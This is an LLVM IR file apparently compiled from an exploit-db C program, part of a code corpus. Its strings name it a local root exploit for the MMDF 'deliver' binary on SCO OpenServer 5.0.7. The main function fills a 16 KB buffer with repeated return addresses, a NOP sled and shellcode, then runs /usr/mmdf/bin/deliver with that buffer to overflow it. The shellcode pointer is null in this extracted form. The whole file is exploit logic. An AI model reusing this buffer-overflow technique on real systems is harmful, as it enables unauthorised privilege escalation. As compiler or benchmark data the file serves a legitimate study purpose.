; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_602.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/sco/local/extr_602.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [62 x i8] c"MMDF deliver local root exploit for SCO OpenServer 5.0.7 x86\0A\00", align 1
@.str.1 = private unnamed_addr constant [41 x i8] c"Copyright 2004 Ramon de Carvalho Valle\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@shellcode = common dso_local global i32* null, align 8
@.str.3 = private unnamed_addr constant [22 x i8] c"/usr/mmdf/bin/deliver\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"deliver\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [16384 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str, i64 0, i64 0))
  %11 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.1, i64 0, i64 0))
  %12 = getelementptr inbounds [16384 x i8], [16384 x i8]* %6, i64 0, i64 0
  %13 = ptrtoint i8* %12 to i64
  %14 = sub i64 %13, 256
  %15 = add i64 %14, 5120
  %16 = add i64 %15, 4097
  %17 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %18 = bitcast i8* %17 to i64*
  store i64 %16, i64* %18, align 1
  %19 = getelementptr inbounds [16384 x i8], [16384 x i8]* %6, i64 0, i64 0
  %20 = call i32 @sprintf(i8* %19, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %21 = getelementptr inbounds [16384 x i8], [16384 x i8]* %6, i64 0, i64 0
  %22 = getelementptr inbounds i8, i8* %21, i64 2
  store i8* %22, i8** %8, align 8
  store i32 0, i32* %9, align 4
  br label %23

23:                                               ; preds = %34, %2
  %24 = load i32, i32* %9, align 4
  %25 = icmp slt i32 %24, 5120
  br i1 %25, label %26, label %37

26:                                               ; preds = %23
  %27 = load i32, i32* %9, align 4
  %28 = srem i32 %27, 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = load i8*, i8** %8, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %8, align 8
  store i8 %31, i8* %32, align 1
  br label %34

34:                                               ; preds = %26
  %35 = load i32, i32* %9, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %9, align 4
  br label %23

37:                                               ; preds = %23
  store i32 0, i32* %9, align 4
  br label %38

38:                                               ; preds = %44, %37
  %39 = load i32, i32* %9, align 4
  %40 = icmp slt i32 %39, 8192
  br i1 %40, label %41, label %47

41:                                               ; preds = %38
  %42 = load i8*, i8** %8, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %8, align 8
  store i8 -112, i8* %42, align 1
  br label %44

44:                                               ; preds = %41
  %45 = load i32, i32* %9, align 4
  %46 = add nsw i32 %45, 1
  store i32 %46, i32* %9, align 4
  br label %38

47:                                               ; preds = %38
  store i32 0, i32* %9, align 4
  br label %48

48:                                               ; preds = %62, %47
  %49 = load i32, i32* %9, align 4
  %50 = load i32*, i32** @shellcode, align 8
  %51 = call i32 @strlen(i32* %50)
  %52 = icmp slt i32 %49, %51
  br i1 %52, label %53, label %65

53:                                               ; preds = %48
  %54 = load i32*, i32** @shellcode, align 8
  %55 = load i32, i32* %9, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds i32, i32* %54, i64 %56
  %58 = load i32, i32* %57, align 4
  %59 = trunc i32 %58 to i8
  %60 = load i8*, i8** %8, align 8
  %61 = getelementptr inbounds i8, i8* %60, i32 1
  store i8* %61, i8** %8, align 8
  store i8 %59, i8* %60, align 1
  br label %62

62:                                               ; preds = %53
  %63 = load i32, i32* %9, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %9, align 4
  br label %48

65:                                               ; preds = %48
  %66 = load i8*, i8** %8, align 8
  store i8 0, i8* %66, align 1
  %67 = getelementptr inbounds [16384 x i8], [16384 x i8]* %6, i64 0, i64 0
  %68 = call i32 @execl(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0), i8* %67, i32 0)
  %69 = load i32, i32* %3, align 4
  ret i32 %69
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
